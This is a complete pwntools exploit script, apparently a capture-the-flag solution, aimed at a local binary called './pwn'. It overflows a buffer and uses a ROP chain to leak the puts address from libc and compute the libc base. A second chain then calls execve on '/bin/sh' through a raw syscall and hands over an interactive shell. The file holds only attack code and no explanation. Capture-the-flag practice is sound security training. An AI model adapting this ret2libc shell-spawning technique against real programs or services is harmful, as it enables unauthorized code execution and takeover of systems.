from pwn import *
context.log_level = 'debug'
sh = process('./pwn')
# sh = remote('127.0.0.1',8001)
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
pop_rdi =0x0000000000402683 
pop_rsi_r15 = 0x0000000000402681


sh.recvuntil('> ')
sh.sendline('1')
sh.recvuntil(': ')
sh.sendline("\x00\x00")
sh.recvuntil('Now you can rop')
sleep(0.1)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

payload = b'a'*0x28 + p64(pop_rdi)
payload += p64(puts_got) + p64(puts_plt)
payload += p64(0x402572)



sh.sendline(payload)
sh.recv(6)
libc_base = u64(sh.recv(6).ljust(8,b'\x00')) - 0x84420
log.success('libc_base: ' + hex(libc_base))

pop_rdx = libc_base + 0x0000000000142c92
pop_rax = libc_base + 0x0000000000036174

binsh_addr = libc_base + 0x00000000001b45bd
syscall = libc_base + 0x000000000002284d
payload = b'a'*0x28 + p64(pop_rdi)
payload += p64(binsh_addr) + p64(pop_rsi_r15) + p64(0) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59) + p64(syscall)


sh.recvuntil('> ')
sh.sendline('1')
sh.recvuntil(': ')
sh.sendline("\x00\x00")
sh.recvuntil('Now you can rop')
sleep(0.1)
sh.sendline(payload)
# gdb.attach(sh)
sh.interactive()